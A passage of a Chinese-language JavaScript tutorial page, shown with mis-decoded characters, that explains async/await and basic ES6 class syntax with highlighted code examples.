å¯¹è±¡æ–¹ä¾¿å¤šäº†ï¼Œå¯ä»¥ç”¨<code>then</code>æ–¹æ³•æŒ‡å®šä¸‹ä¸€æ­¥çš„æ“ä½œã€‚è¿›ä¸€æ­¥è¯´ï¼Œ<code>async</code>å‡½æ•°å®Œå…¨å¯ä»¥çœ‹ä½œå¤šä¸ªå¼‚æ­¥æ“ä½œï¼ŒåŒ…è£…æˆçš„ä¸€ä¸ª Promise å¯¹è±¡ï¼Œè€Œ<code>await</code>å‘½ä»¤å°±æ˜¯å†…éƒ¨<code>then</code>å‘½ä»¤çš„è¯­æ³•ç³–ã€‚</p><h2 id="2ã€åŸºæœ¬ç”¨æ³•-1"><a href="#2ã€åŸºæœ¬ç”¨æ³•-1" class="headerlink" title="2ã€åŸºæœ¬ç”¨æ³•"></a>2ã€åŸºæœ¬ç”¨æ³•</h2><p><code>async</code>å‡½æ•°è¿”å›ä¸€ä¸ª Promise å¯¹è±¡ï¼Œå¯ä»¥ä½¿ç”¨<code>then</code>æ–¹æ³•æ·»åŠ å›è°ƒå‡½æ•°ã€‚å½“å‡½æ•°æ‰§è¡Œçš„æ—¶å€™ï¼Œä¸€æ—¦é‡åˆ°<code>await</code>å°±ä¼šå…ˆè¿”å›ï¼Œç­‰åˆ°å¼‚æ­¥æ“ä½œå®Œæˆï¼Œå†æ¥ç€æ‰§è¡Œå‡½æ•°ä½“å†…åé¢çš„è¯­å¥ã€‚</p><p>async å‡½æ•°æœ‰å¤šç§ä½¿ç”¨å½¢å¼ã€‚</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// å‡½æ•°å£°æ˜</span></span><br><span class="line"><span class="keyword">async</span> <span class="function"><span class="keyword">function</span> <span class="title">foo</span>(<span class="params"></span>) </span>&#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// å‡½æ•°è¡¨è¾¾å¼</span></span><br><span class="line"><span class="keyword">const</span> foo = <span class="keyword">async</span> <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// å¯¹è±¡çš„æ–¹æ³•</span></span><br><span class="line"><span class="keyword">let</span> obj = &#123; <span class="keyword">async</span> <span class="function"><span class="title">foo</span>(<span class="params"></span>)</span> &#123;&#125; &#125;;</span><br><span class="line">obj.foo().then(...)</span><br><span class="line"></span><br><span class="line"><span class="comment">// Class çš„æ–¹æ³•</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Storage</span> </span>&#123;</span><br><span class="line">  <span class="function"><span class="title">constructor</span>(<span class="params"></span>)</span> &#123;</span><br><span class="line">    <span class="built_in">this</span>.cachePromise = caches.open(<span class="string">&#x27;avatars&#x27;</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">async</span> <span class="function"><span class="title">getAvatar</span>(<span class="params">name</span>)</span> &#123;</span><br><span class="line">    <span class="keyword">const</span> cache = <span class="keyword">await</span> <span class="built_in">this</span>.cachePromise;</span><br><span class="line">    <span class="keyword">return</span> cache.match(<span class="string">`/avatars/<span class="subst">$&#123;name&#125;</span>.jpg`</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> storage = <span class="keyword">new</span> Storage();</span><br><span class="line">storage.getAvatar(<span class="string">&#x27;jake&#x27;</span>).then(â€¦);</span><br><span class="line"></span><br><span class="line"><span class="comment">// ç®­å¤´å‡½æ•°</span></span><br><span class="line"><span class="keyword">const</span> foo = <span class="keyword">async</span> () =&gt; &#123;&#125;;</span><br></pre></td></tr></table></figure><h2 id="3ã€è¯­æ³•"><a href="#3ã€è¯­æ³•" class="headerlink" title="3ã€è¯­æ³•"></a>3ã€è¯­æ³•</h2><h3 id="è¿”å›-Promise-å¯¹è±¡"><a href="#è¿”å›-Promise-å¯¹è±¡" class="headerlink" title="è¿”å› Promise å¯¹è±¡"></a>è¿”å› Promise å¯¹è±¡</h3><p><code>async</code>å‡½æ•°è¿”å›ä¸€ä¸ª Promise å¯¹è±¡ã€‚<code>async</code>å‡½æ•°å†…éƒ¨<code>return</code>è¯­å¥è¿”å›çš„å€¼ï¼Œä¼šæˆä¸º<code>then</code>æ–¹æ³•å›è°ƒå‡½æ•°çš„å‚æ•°ã€‚</p><p><code>async</code>å‡½æ•°å†…éƒ¨æŠ›å‡ºé”™è¯¯ï¼Œä¼šå¯¼è‡´è¿”å›çš„ Promise å¯¹è±¡å˜ä¸º<code>reject</code>çŠ¶æ€ã€‚æŠ›å‡ºçš„é”™è¯¯å¯¹è±¡ä¼šè¢«<code>catch</code>æ–¹æ³•å›è°ƒå‡½æ•°æ¥æ”¶åˆ°ã€‚</p><h3 id="Promise-å¯¹è±¡çš„çŠ¶æ€å˜åŒ–"><a href="#Promise-å¯¹è±¡çš„çŠ¶æ€å˜åŒ–" class="headerlink" title="Promise å¯¹è±¡çš„çŠ¶æ€å˜åŒ–"></a>Promise å¯¹è±¡çš„çŠ¶æ€å˜åŒ–</h3><p><code>async</code>å‡½æ•°è¿”å›çš„ Promise å¯¹è±¡ï¼Œå¿…é¡»ç­‰åˆ°å†…éƒ¨æ‰€æœ‰<code>await</code>å‘½ä»¤åé¢çš„ Promise å¯¹è±¡æ‰§è¡Œå®Œï¼Œæ‰ä¼šå‘ç”ŸçŠ¶æ€æ”¹å˜ï¼Œé™¤éé‡åˆ°<code>return</code>è¯­å¥æˆ–è€…æŠ›å‡ºé”™è¯¯ã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œåªæœ‰<code>async</code>å‡½æ•°å†…éƒ¨çš„å¼‚æ­¥æ“ä½œæ‰§è¡Œå®Œï¼Œæ‰ä¼šæ‰§è¡Œ<code>then</code>æ–¹æ³•æŒ‡å®šçš„å›è°ƒå‡½æ•°ã€‚</p><h3 id="await-å‘½ä»¤"><a href="#await-å‘½ä»¤" class="headerlink" title="await å‘½ä»¤"></a>await å‘½ä»¤</h3><p>æ­£å¸¸æƒ…å†µä¸‹ï¼Œ<code>await</code>å‘½ä»¤åé¢æ˜¯ä¸€ä¸ª Promise å¯¹è±¡ï¼Œè¿”å›è¯¥å¯¹è±¡çš„ç»“æœã€‚å¦‚æœä¸æ˜¯ Promise å¯¹è±¡ï¼Œå°±ç›´æ¥è¿”å›å¯¹åº”çš„å€¼ã€‚</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">async</span> <span class="function"><span class="keyword">function</span> <span class="title">f</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="comment">// ç­‰åŒäº return 123;</span></span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">await</span> <span class="number">123</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">f().then(<span class="function"><span class="params">v</span> =&gt;</span> <span class="built_in">console</span>.log(v))</span><br><span class="line"><span class="comment">// 123</span></span><br></pre></td></tr></table></figure><p>å¦ä¸€ç§æƒ…å†µæ˜¯ï¼Œ<code>await</code>å‘½ä»¤åé¢æ˜¯ä¸€ä¸ª<code>thenable</code>å¯¹è±¡ï¼ˆå³å®šä¹‰äº†<code>then</code>æ–¹æ³•çš„å¯¹è±¡ï¼‰ï¼Œé‚£ä¹ˆ<code>await</code>ä¼šå°†å…¶ç­‰åŒäº Promise å¯¹è±¡ã€‚</p><p>ä»»ä½•ä¸€ä¸ª<code>await</code>è¯­å¥åé¢çš„ Promise å¯¹è±¡å˜ä¸º<code>reject</code>çŠ¶æ€ï¼Œé‚£ä¹ˆæ•´ä¸ª<code>async</code>å‡½æ•°éƒ½ä¼šä¸­æ–­æ‰§è¡Œã€‚æœ‰æ—¶ï¼Œæˆ‘ä»¬å¸Œæœ›å³ä½¿å‰ä¸€ä¸ªå¼‚æ­¥æ“ä½œå¤±è´¥ï¼Œä¹Ÿä¸è¦ä¸­æ–­åé¢çš„å¼‚æ­¥æ“ä½œã€‚è¿™æ—¶å¯ä»¥å°†ç¬¬ä¸€ä¸ª<code>await</code>æ”¾åœ¨<code>try...catch</code>ç»“æ„é‡Œé¢ï¼Œè¿™æ ·ä¸ç®¡è¿™ä¸ªå¼‚æ­¥æ“ä½œæ˜¯å¦æˆåŠŸï¼Œç¬¬äºŒä¸ª<code>await</code>éƒ½ä¼šæ‰§è¡Œã€‚</p><h3 id="é”™è¯¯å¤„ç†"><a href="#é”™è¯¯å¤„ç†" class="headerlink" title="é”™è¯¯å¤„ç†"></a>é”™è¯¯å¤„ç†</h3><p>å¦‚æœ<code>await</code>åé¢çš„å¼‚æ­¥æ“ä½œå‡ºé”™ï¼Œé‚£ä¹ˆç­‰åŒäº<code>async</code>å‡½æ•°è¿”å›çš„ Promise å¯¹è±¡è¢«<code>reject</code>ã€‚é˜²æ­¢å‡ºé”™çš„æ–¹æ³•ï¼Œä¹Ÿæ˜¯å°†å…¶æ”¾åœ¨<code>try...catch</code>ä»£ç å—ä¹‹ä¸­ã€‚</p><h3 id="ä½¿ç”¨æ³¨æ„ç‚¹-1"><a href="#ä½¿ç”¨æ³¨æ„ç‚¹-1" class="headerlink" title="ä½¿ç”¨æ³¨æ„ç‚¹"></a>ä½¿ç”¨æ³¨æ„ç‚¹</h3><ul><li><p>ç¬¬ä¸€ç‚¹ï¼Œå‰é¢å·²ç»è¯´è¿‡ï¼Œ<code>await</code>å‘½ä»¤åé¢çš„<code>Promise</code>å¯¹è±¡ï¼Œè¿è¡Œç»“æœå¯èƒ½æ˜¯<code>rejected</code>ï¼Œæ‰€ä»¥æœ€å¥½æŠŠ<code>await</code>å‘½ä»¤æ”¾åœ¨<code>try...catch</code>ä»£ç å—ä¸­ã€‚</p></li><li><p>ç¬¬äºŒç‚¹ï¼Œå¤šä¸ª<code>await</code>å‘½ä»¤åé¢çš„å¼‚æ­¥æ“ä½œï¼Œå¦‚æœä¸å­˜åœ¨ç»§å‘å…³ç³»ï¼Œæœ€å¥½è®©å®ƒä»¬åŒæ—¶è§¦å‘ã€‚</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> foo = <span class="keyword">await</span> getFoo();</span><br><span class="line"><span class="keyword">let</span> bar = <span class="keyword">await</span> getBar();</span><br></pre></td></tr></table></figure><p>ä¸Šé¢ä»£ç ä¸­ï¼Œ<code>getFoo</code>å’Œ<code>getBar</code>æ˜¯ä¸¤ä¸ªç‹¬ç«‹çš„å¼‚æ­¥æ“ä½œï¼ˆå³äº’ä¸ä¾èµ–ï¼‰ï¼Œè¢«å†™æˆç»§å‘å…³ç³»ã€‚è¿™æ ·æ¯”è¾ƒè€—æ—¶ï¼Œå› ä¸ºåªæœ‰<code>getFoo</code>å®Œæˆä»¥åï¼Œæ‰ä¼šæ‰§è¡Œ<code>getBar</code>ï¼Œå®Œå…¨å¯ä»¥è®©å®ƒä»¬åŒæ—¶è§¦å‘ã€‚</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// å†™æ³•ä¸€</span></span><br><span class="line"><span class="keyword">let</span> [foo, bar] = <span class="keyword">await</span> <span class="built_in">Promise</span>.all([getFoo(), getBar()]);</span><br><span class="line"></span><br><span class="line"><span class="comment">// å†™æ³•äºŒ</span></span><br><span class="line"><span class="keyword">let</span> fooPromise = getFoo();</span><br><span class="line"><span class="keyword">let</span> barPromise = getBar();</span><br><span class="line"><span class="keyword">let</span> foo = <span class="keyword">await</span> fooPromise;</span><br><span class="line"><span class="keyword">let</span> bar = <span class="keyword">await</span> barPromise;</span><br></pre></td></tr></table></figure><p>ä¸Šé¢ä¸¤ç§å†™æ³•ï¼Œ<code>getFoo</code>å’Œ<code>getBar</code>éƒ½æ˜¯åŒæ—¶è§¦å‘ï¼Œè¿™æ ·å°±ä¼šç¼©çŸ­ç¨‹åºçš„æ‰§è¡Œæ—¶é—´ã€‚</p></li><li><p>ç¬¬ä¸‰ç‚¹ï¼Œ<code>await</code>å‘½ä»¤åªèƒ½ç”¨åœ¨<code>async</code>å‡½æ•°ä¹‹ä¸­ï¼Œå¦‚æœç”¨åœ¨æ™®é€šå‡½æ•°ï¼Œå°±ä¼šæŠ¥é”™ã€‚</p></li><li><p>ç¬¬å››ç‚¹ï¼Œasync å‡½æ•°å¯ä»¥ä¿ç•™è¿è¡Œå †æ ˆã€‚</p></li></ul><h2 id="4ã€async-å‡½æ•°çš„å®ç°åŸç†"><a href="#4ã€async-å‡½æ•°çš„å®ç°åŸç†" class="headerlink" title="4ã€async å‡½æ•°çš„å®ç°åŸç†"></a>4ã€async å‡½æ•°çš„å®ç°åŸç†</h2><p>async å‡½æ•°çš„å®ç°åŸç†ï¼Œå°±æ˜¯å°† Generator å‡½æ•°å’Œè‡ªåŠ¨æ‰§è¡Œå™¨ï¼ŒåŒ…è£…åœ¨ä¸€ä¸ªå‡½æ•°é‡Œã€‚</p><h2 id="5ã€ä¸å…¶ä»–å¼‚æ­¥å¤„ç†æ–¹æ³•çš„æ¯”è¾ƒ"><a href="#5ã€ä¸å…¶ä»–å¼‚æ­¥å¤„ç†æ–¹æ³•çš„æ¯”è¾ƒ" class="headerlink" title="5ã€ä¸å…¶ä»–å¼‚æ­¥å¤„ç†æ–¹æ³•çš„æ¯”è¾ƒ"></a>5ã€ä¸å…¶ä»–å¼‚æ­¥å¤„ç†æ–¹æ³•çš„æ¯”è¾ƒ</h2><p>å‡å®šæŸä¸ª DOM å…ƒç´ ä¸Šé¢ï¼Œéƒ¨ç½²äº†ä¸€ç³»åˆ—çš„åŠ¨ç”»ï¼Œå‰ä¸€ä¸ªåŠ¨ç”»ç»“æŸï¼Œæ‰èƒ½å¼€å§‹åä¸€ä¸ªã€‚å¦‚æœå½“ä¸­æœ‰ä¸€ä¸ªåŠ¨ç”»å‡ºé”™ï¼Œå°±ä¸å†å¾€ä¸‹æ‰§è¡Œï¼Œè¿”å›ä¸Šä¸€ä¸ªæˆåŠŸæ‰§è¡Œçš„åŠ¨ç”»çš„è¿”å›å€¼ã€‚</p><p>async å‡½æ•°çš„å†™æ³•ã€‚</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">async</span> <span class="function"><span class="keyword">function</span> <span class="title">chainAnimationsAsync</span>(<span class="params">elem, animations</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">let</span> ret = <span class="literal">null</span>;</span><br><span class="line">  <span class="keyword">try</span> &#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">let</span> anim <span class="keyword">of</span> animations) &#123;</span><br><span class="line">      ret = <span class="keyword">await</span> anim(elem);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125; <span class="keyword">catch</span>(e) &#123;</span><br><span class="line">    <span class="comment">/* å¿½ç•¥é”™è¯¯ï¼Œç»§ç»­æ‰§è¡Œ */</span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="6ã€å®ä¾‹ï¼šæŒ‰é¡ºåºå®Œæˆå¼‚æ­¥æ“ä½œ"><a href="#6ã€å®ä¾‹ï¼šæŒ‰é¡ºåºå®Œæˆå¼‚æ­¥æ“ä½œ" class="headerlink" title="6ã€å®ä¾‹ï¼šæŒ‰é¡ºåºå®Œæˆå¼‚æ­¥æ“ä½œ"></a>6ã€å®ä¾‹ï¼šæŒ‰é¡ºåºå®Œæˆå¼‚æ­¥æ“ä½œ</h2><p>ä¾æ¬¡è¿œç¨‹è¯»å–ä¸€ç»„ URLï¼Œç„¶åæŒ‰ç…§è¯»å–çš„é¡ºåºè¾“å‡ºç»“æœã€‚</p><p>sync å‡½æ•°å®ç°ã€‚</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">async</span> <span class="function"><span class="keyword">function</span> <span class="title">logInOrder</span>(<span class="params">urls</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">const</span> url <span class="keyword">of</span> urls) &#123;</span><br><span class="line">    <span class="keyword">const</span> response = <span class="keyword">await</span> fetch(url);</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="keyword">await</span> response.text());</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ä¸Šé¢ä»£ç ç¡®å®å¤§å¤§ç®€åŒ–ï¼Œé—®é¢˜æ˜¯æ‰€æœ‰è¿œç¨‹æ“ä½œéƒ½æ˜¯ç»§å‘ã€‚åªæœ‰å‰ä¸€ä¸ª URL è¿”å›ç»“æœï¼Œæ‰ä¼šå»è¯»å–ä¸‹ä¸€ä¸ª URLï¼Œè¿™æ ·åšæ•ˆç‡å¾ˆå·®ï¼Œéå¸¸æµªè´¹æ—¶é—´ã€‚æˆ‘ä»¬éœ€è¦çš„æ˜¯å¹¶å‘å‘å‡ºè¿œç¨‹è¯·æ±‚ã€‚</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">async</span> <span class="function"><span class="keyword">function</span> <span class="title">logInOrder</span>(<span class="params">urls</span>) </span>&#123;</span><br><span class="line">  <span class="comment">// å¹¶å‘è¯»å–è¿œç¨‹URL</span></span><br><span class="line">  <span class="keyword">const</span> textPromises = urls.map(<span class="keyword">async</span> url =&gt; &#123;</span><br><span class="line">    <span class="keyword">const</span> response = <span class="keyword">await</span> fetch(url);</span><br><span class="line">    <span class="keyword">return</span> response.text();</span><br><span class="line">  &#125;);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// æŒ‰æ¬¡åºè¾“å‡º</span></span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">const</span> textPromise <span class="keyword">of</span> textPromises) &#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="keyword">await</span> textPromise);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ä¸Šé¢ä»£ç ä¸­ï¼Œè™½ç„¶<code>map</code>æ–¹æ³•çš„å‚æ•°æ˜¯<code>async</code>å‡½æ•°ï¼Œä½†å®ƒæ˜¯å¹¶å‘æ‰§è¡Œçš„ï¼Œå› ä¸ºåªæœ‰<code>async</code>å‡½æ•°å†…éƒ¨æ˜¯ç»§å‘æ‰§è¡Œï¼Œå¤–éƒ¨ä¸å—å½±å“ã€‚åé¢çš„<code>for..of</code>å¾ªç¯å†…éƒ¨ä½¿ç”¨äº†<code>await</code>ï¼Œå› æ­¤å®ç°äº†æŒ‰é¡ºåºè¾“å‡ºã€‚</p><h1 id="Class-çš„åŸºæœ¬è¯­æ³•"><a href="#Class-çš„åŸºæœ¬è¯­æ³•" class="headerlink" title="Class çš„åŸºæœ¬è¯­æ³•"></a>Class çš„åŸºæœ¬è¯­æ³•</h1><h2 id="1ã€ç®€ä»‹-1"><a href="#1ã€ç®€ä»‹-1" class="headerlink" title="1ã€ç®€ä»‹"></a>1ã€ç®€ä»‹</h2><h3 id="ç±»çš„ç”±æ¥"><a href="#ç±»çš„ç”±æ¥" class="headerlink" title="ç±»çš„ç”±æ¥"></a>ç±»çš„ç”±æ¥</h3><p>JavaScript è¯­è¨€ä¸­ï¼Œç”Ÿæˆå®ä¾‹å¯¹è±¡çš„ä¼ ç»Ÿæ–¹æ³•æ˜¯é€šè¿‡æ„é€ å‡½æ•°ã€‚ES6 çš„<code>class</code>å¯ä»¥çœ‹ä½œåªæ˜¯ä¸€ä¸ªè¯­æ³•ç³–ã€‚</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Point</span> </span>&#123;</span><br><span class="line">  <span class="function"><span class="title">constructor</span>(<span class="params">x, y</span>)</span> &#123;</span><br><span class="line">    <span class="built_in">this</span>.x = x;</span><br><span class="line">    <span class="built_in">this</span>.y = y;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="title">toString</span>(<span class="params"></span>)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;(&#x27;</span> + <span class="built_in">this</span>.x + <span class="string">&#x27;, &#x27;</span> + <span class="built_in">this</span>.y + <span class="string">&#x27;)&#x27;</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ä¸Šé¢ä»£ç å®šä¹‰äº†ä¸€ä¸ªâ€œç±»â€ï¼Œå¯ä»¥çœ‹åˆ°é‡Œé¢æœ‰ä¸€ä¸ª<code>constructor()</code>æ–¹æ³•ï¼Œè¿™å°±æ˜¯æ„é€ æ–¹æ³•ï¼Œè€Œ<code>this</code>å…³é”®å­—åˆ™ä»£è¡¨å®ä¾‹å¯¹è±¡ã€‚<code>Point</code>ç±»é™¤äº†æ„é€ æ–¹æ³•ï¼Œè¿˜å®šä¹‰äº†ä¸€ä¸ª<code>toString()</code>æ–¹æ³•ã€‚æ³¨æ„ï¼Œå®šä¹‰<code>toString()</code>æ–¹æ³•çš„æ—¶å€™ï¼Œå‰é¢ä¸éœ€è¦åŠ ä¸Š<code>function</code>è¿™ä¸ªå…³é”®å­—ï¼Œç›´æ¥æŠŠå‡½æ•°å®šä¹‰æ”¾è¿›å»äº†å°±å¯ä»¥äº†ã€‚</p><p>ES6 çš„ç±»ï¼Œå®Œå…¨å¯ä»¥çœ‹ä½œæ„é€ å‡½æ•°çš„å¦ä¸€ç§å†™æ³•ã€‚ç±»çš„æ•°æ®ç±»å‹å°±æ˜¯å‡½æ•°ï¼Œç±»æœ¬èº«å°±æŒ‡å‘æ„é€ å‡½æ•°ã€‚ä½¿ç”¨çš„æ—¶å€™ï¼Œä¹Ÿæ˜¯ç›´æ¥å¯¹ç±»ä½¿ç”¨<code>new</code>å‘½ä»¤ï¼Œè·Ÿæ„é€ å‡½æ•°çš„ç”¨æ³•å®Œå…¨ä¸€è‡´ã€‚</p><p>æ„é€ å‡½æ•°çš„<code>prototype</code>å±æ€§ï¼Œåœ¨ ES6 çš„â€œç±»â€ä¸Šé¢ç»§ç»­å­˜åœ¨ã€‚äº‹å®ä¸Šï¼Œç±»çš„æ‰€æœ‰æ–¹æ³•éƒ½å®šä¹‰åœ¨ç±»çš„<code>prototype</code>å±æ€§ä¸Šé¢ã€‚</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Point</span> </span>&#123;</span><br><span class="line">  <span class="function"><span class="title">constructor</span>(<span class="params"></span>)</span> &#123;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="title">toString</span>(<span class="params"></span>)</span> &#123;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="title">toValue</span>(<span class="params"></span>)</span> &#123;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// ç­‰åŒäº</span></span><br><span class="line"></span><br><span class="line">Point.prototype = &#123;</span><br><span class="line">  <span class="function"><span class="title">constructor</span>(<span class="params"></span>)</span> &#123;&#125;,</span><br><span class="line">  <span class="function"><span class="title">toString</span>(<span class="params"></span>)</span> &#123;&#125;,</span><br><span class="line">  <span class="function"><span class="title">toValue</span>(<span class="params"></span>)</span> &#123;&#125;,</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>å› æ­¤ï¼Œåœ¨ç±»çš„å®ä¾‹ä¸Šé¢è°ƒç”¨æ–¹æ³•ï¼Œå…¶å®å°±æ˜¯è°ƒç”¨åŸå‹ä¸Šçš„æ–¹æ³•ã€‚</p><p>ç”±äºç±»çš„æ–¹æ³•éƒ½å®šä¹‰åœ¨<code>prototype</code>å¯¹è±¡ä¸Šé¢ï¼Œæ‰€ä»¥ç±»çš„æ–°æ–¹æ³•å¯ä»¥æ·»åŠ åœ¨<code>prototype</code>å¯¹è±¡ä¸Šé¢ã€‚<code>Object.assign()</code>æ–¹æ³•å¯ä»¥å¾ˆæ–¹ä¾¿åœ°ä¸€æ¬¡å‘ç±»æ·»åŠ å¤šä¸ªæ–¹æ³•ã€‚</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Point</span> </span>&#123;</span><br><span class="line">  <span class="function"><span class="title">constructor</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">Object</span>.assign(Point.prototype, &#123;</span><br><span class="line">  <span class="function"><span class="title">toString</span>(<span class="params"></span>)</span>&#123;&#125;,</span><br><span class="line">  <span class="function"><span class="title">toValue</span>(<span class="params"></span>)</span>&#123;&#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>å¦å¤–ï¼Œç±»çš„å†…éƒ¨æ‰€æœ‰å®šä¹‰çš„æ–¹æ³•ï¼Œéƒ½æ˜¯ä¸å¯æšä¸¾çš„ï¼ˆnon-enumerableï¼‰ã€‚</p><h3 id="constructor-æ–¹æ³•"><a href="#constructor-æ–¹æ³•" class="headerlink" title="constructor æ–¹æ³•"></a>constructor æ–¹æ³•</h3><p><code>constructor()</code>æ–¹æ³•æ˜¯ç±»çš„é»˜è®¤æ–¹æ³•ï¼Œé€šè¿‡<code>new</code>å‘½ä»¤ç”Ÿæˆå¯¹è±¡å®ä¾‹æ—¶ï¼Œè‡ªåŠ¨è°ƒç”¨è¯¥æ–¹æ³•ï¼Œé»˜è®¤è¿”å›å®ä¾‹å¯¹è±¡ï¼ˆå³<code>this</code>ï¼‰ã€‚ä¸€ä¸ªç±»å¿…é¡»æœ‰<code>constructor()</code>æ–¹æ³•ï¼Œå¦‚æœæ²¡æœ‰æ˜¾å¼å®šä¹‰ï¼Œä¸€ä¸ªç©ºçš„<code>constructor()</code>æ–¹æ³•ä¼šè¢«é»˜è®¤æ·»åŠ ã€‚</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Point</span> </span>&#123;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// ç­‰åŒäº</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Point</span> </span>&#123;</span><br><span class="line">  <span class="function"><span class="title">constructor</span>(<span class="params"></span>)</span> &#123;&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ç±»å¿…é¡»ä½¿ç”¨<code>new</code>è°ƒç”¨ï¼Œå¦åˆ™ä¼šæŠ¥é”™ã€‚è¿™æ˜¯å®ƒè·Ÿæ™®é€šæ„é€ å‡½æ•°çš„ä¸€ä¸ªä¸»è¦åŒºåˆ«ï¼Œåè€…ä¸ç”¨<code>new</code>ä¹Ÿå¯ä»¥æ‰§è¡Œã€‚</p><h3 id="ç±»çš„å®ä¾‹"><a href="#ç±»çš„å®ä¾‹" class="headerlink" title="ç±»çš„å®ä¾‹"></a>ç±»çš„å®ä¾‹</h3><p>å®ä¾‹çš„å±æ€§é™¤éæ˜¾å¼å®šä¹‰åœ¨å…¶æœ¬èº«ï¼ˆå³å®šä¹‰åœ¨<code>this</code>å¯¹è±¡ä¸Šï¼‰ï¼Œå¦åˆ™éƒ½æ˜¯å®šä¹‰åœ¨åŸå‹ä¸Šï¼ˆå³å®šä¹‰åœ¨<code>class</code>ä¸Šï¼‰ã€‚</p><p>ç±»çš„æ‰€æœ‰å®ä¾‹å…±äº«ä¸€ä¸ªåŸå‹å¯¹è±¡ã€‚è¿™ä¹Ÿæ„å‘³ç€ï¼Œå¯ä»¥é€šè¿‡å®ä¾‹çš„<code>__proto__</code>å±æ€§ä¸ºâ€œç±»â€æ·»åŠ æ–¹æ³•ã€‚</p><h3 id="å–å€¼å‡½æ•°ï¼ˆgetterï¼‰å’Œå­˜å€¼å‡½æ•°ï¼ˆsetterï¼‰"><a href="#å–å€¼å‡½æ•°ï¼ˆgetterï¼‰å’Œå­˜å€¼å‡½æ•°ï¼ˆsetterï¼‰" class="headerlink" title="å–å€¼å‡½æ•°ï¼ˆgetterï¼‰å’Œå­˜å€¼å‡½æ•°ï¼ˆsetterï¼‰"></a>å–å€¼å‡½æ•°ï¼ˆgetterï¼‰å’Œå­˜å€¼å‡½æ•°ï¼ˆsetterï¼‰</h3><h3 id="å±æ€§è¡¨è¾¾å¼"><a href="#å±æ€§è¡¨è¾¾å¼" class="headerlink" title="å±æ€§è¡¨è¾¾å¼"></a>å±æ€§è¡¨è¾¾å¼</h3><p>ç±»çš„å±æ€§åï¼Œå¯ä»¥é‡‡ç”¨è¡¨è¾¾å¼ã€‚</p><h3 id="æ³¨æ„ç‚¹-2"><a href="#æ³¨æ„ç‚¹-2" class="headerlink" title="æ³¨æ„ç‚¹"></a>æ³¨æ„ç‚¹</h3><p><strong>ï¼ˆ1ï¼‰ä¸¥æ ¼æ¨¡å¼</strong></p><p>ç±»å’Œæ¨¡å—çš„å†…éƒ¨ï¼Œé»˜è®¤å°±æ˜¯ä¸¥æ ¼æ¨¡å¼ï¼Œæ‰€ä»¥ä¸éœ€è¦ä½¿ç”¨<code>use strict</code>æŒ‡å®šè¿è¡Œæ¨¡å¼ã€‚</p><p><strong>ï¼ˆ2ï¼‰ä¸å­˜åœ¨æå‡</strong></p><p>ç±»ä¸å­˜åœ¨å˜é‡æå‡ï¼ˆhoistï¼‰</p><p><strong>ï¼ˆ3ï¼‰name å±æ€§</strong></p><p>ç”±äºæœ¬è´¨ä¸Šï¼ŒES6 çš„ç±»åªæ˜¯ ES5 çš„æ„é€ 